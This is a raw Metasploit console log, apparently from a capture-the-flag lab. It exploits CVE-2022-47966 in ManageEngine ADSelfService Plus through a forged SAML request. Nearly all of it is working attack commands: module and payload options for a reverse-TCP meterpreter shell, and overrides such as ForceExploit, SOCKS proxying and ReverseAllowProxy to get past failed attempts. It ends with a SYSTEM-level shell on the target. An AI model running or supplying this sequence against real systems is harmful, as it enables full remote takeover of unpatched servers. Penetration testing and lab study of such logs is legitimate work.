msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > options

Module options (exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966):

   Name         Current Setting                               Required  Description
   ----         ---------------                               --------  -----------
   GUID         67a8d101690402dc6a6744b8fc8a7ca1acf88b2f      yes       The SAML endpoint GUID
   ISSUER_URL   http://dc.cerberus.local/adfs/services/trust  yes       The Issuer URL used by the Identity Provider which has been configured as the SAML authentication provider for the
                                                                        target server
   Proxies                                                    no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks
                                                                        5h
   RELAY_STATE                                                no        The Relay State. Default is "http(s)://<rhost>:<rport>/samlLogin/LoginAuth"
   RHOSTS       127.0.0.1                                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        9251                                          yes       The target port (TCP)
   SSL          true                                          no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                                    no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI    /samlLogin                                    yes       The SAML endpoint URL
   URIPATH                                                    no        The URI to use for this exploit (default is random)
   VHOST                                                      no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/x64/meterpreter/reverse_tcp_rc4):

   Name         Current Setting   Required  Description
   ----         ---------------   --------  -----------
   EXITFUNC     process           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST        10.10.17.19       yes       The listen address (an interface may be specified)
   LPORT        4444              yes       The listen port
   RC4PASSWORD  mryFnlywB9_N8gvc  yes       Password to derive RC4 key from


Exploit target:

   Id  Name
   --  ----
   0   Windows EXE Dropper



View the full module info with the info, or info -d command.

msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > run
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > run
[*] Started reverse TCP handler on 10.10.17.19:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set ForceExploit true
ForceExploit => true
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > run
[*] Started reverse TCP handler on 10.10.17.19:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Cannot reliably check exploitability. ForceExploit is enabled, proceeding with exploitation.
[-] Exploit aborted due to failure: unknown: Unknown error returned (HTTP code: )
[*] Exploit completed, but no session was created.
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set proxies socks5:127.0.0.1:1080
proxies => socks5:127.0.0.1:1080
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > run
[-] Exploit failed: RuntimeError TCP connect-back payloads cannot be used with Proxies. Use 'set ReverseAllowProxy true' to override this behaviour.
[*] Exploit completed, but no session was created.
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set ReverseAllowProxy true
ReverseAllowProxy => true
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > run
[*] Started reverse TCP handler on 10.10.17.19:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Command Stager progress -  16.07% done (2046/12728 bytes)
[*] Command Stager progress -  32.15% done (4092/12728 bytes)
[*] Command Stager progress -  48.22% done (6138/12728 bytes)
[*] Command Stager progress -  64.30% done (8184/12728 bytes)
[*] Command Stager progress -  80.37% done (10230/12728 bytes)
[*] Command Stager progress -  96.35% done (12263/12728 bytes)
[*] Command Stager progress - 100.00% done (12728/12728 bytes)
[*] Sending stage (232010 bytes) to 10.129.232.100
[*] Meterpreter session 1 opened (10.10.17.19:4444 -> 10.129.232.100:54616) at 2026-02-12 17:33:03 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```